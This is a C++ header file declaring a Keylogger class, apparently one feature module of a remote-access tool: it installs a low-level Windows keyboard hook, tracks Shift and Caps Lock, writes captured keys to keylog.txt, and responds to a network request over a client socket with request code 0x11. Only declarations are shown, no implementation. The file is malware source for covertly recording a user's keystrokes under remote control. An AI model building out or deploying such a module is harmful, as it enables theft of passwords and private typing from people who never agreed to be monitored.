#pragma once
#include <atomic>
#include <string>

#include "RequestHandler.hpp"

class Keylogger : public FeatureHandler {
    constexpr static int REQUEST_KEY = 0x11;
    constexpr static std::string KEYLOG_FILENAME = "keylog.txt";
    static std::atomic_bool isKeyloggerRunning;
    static FILE *keylogFile;
    static HANDLE hThread;
    static DWORD  dwThreadID;
    static HHOOK hKeyboardHook;
    static HINSTANCE hKeyboardInstance;
    static std::atomic_bool isShiftPressed;
    static std::atomic_bool isCapsLockOn;
public:
    static DWORD WINAPI SKeylogger();
    static void StopKeylogger();
    static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam);
    void HandleRequest(SOCKET client_socket, const PacketHeader &header) override;
};
